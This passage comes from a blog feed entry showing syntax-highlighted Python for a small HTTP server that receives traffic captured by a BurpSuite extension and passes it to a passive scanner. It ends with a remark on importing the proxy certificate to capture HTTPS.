class="string">'req_host'</span>]</span><br><span class="line">        req_method = receive_data[<span class="string">'req_method'</span>]</span><br><span class="line">        data = receive_data[<span class="string">'data'</span>]</span><br><span class="line">        content_deal(req_headers, req_host, req_method, postdata=req_body, uri=req_url, packet=data)</span><br><span class="line"></span><br><span class="line">        self.wfile.write(<span class="string">"POST request for &#123;&#125;"</span>.format(self.headers).encode(<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(server_class=HTTPServer, handler_class=S, port=<span class="number">8888</span>)</span>:</span></span><br><span class="line">    logging.basicConfig(level=logging.INFO)</span><br><span class="line">    server_address = (<span class="string">'0.0.0.0'</span>, port)</span><br><span class="line">    httpd = server_class(server_address, handler_class)</span><br><span class="line">    logging.info(<span class="string">'Starting httpd...\n'</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        httpd.serve_forever()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    httpd.server_close()</span><br><span class="line">    logging.info(<span class="string">'Stopping httpd...\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(argv) == <span class="number">2</span>:</span><br><span class="line">        run(port=int(argv[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        run()</span><br></pre></td></tr></table></figure><p>The function content_deal() is declared in the passive scanner system which written in python.</p><p>one last thing we should pay attention to is that if we decide to use BurpSuite to transfer the https data, we must import the BurpSuite certificate. Of course, in addition to using BurpSuite, we also have many other choices, such as sslsplit, mitmproxy…and we need to import the right certificates by the same.</p>]]></content>
    
    <summary type="html">
    
      A simple BurpSuite Jython extension to capture https traffic, which is used in the passive scanning.
    
    </summary>
    
    
      <category term="Python" scheme="https://recursively.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://recursively.github.io/tags/Python/"/>
    
  </entry>
  
</feed>
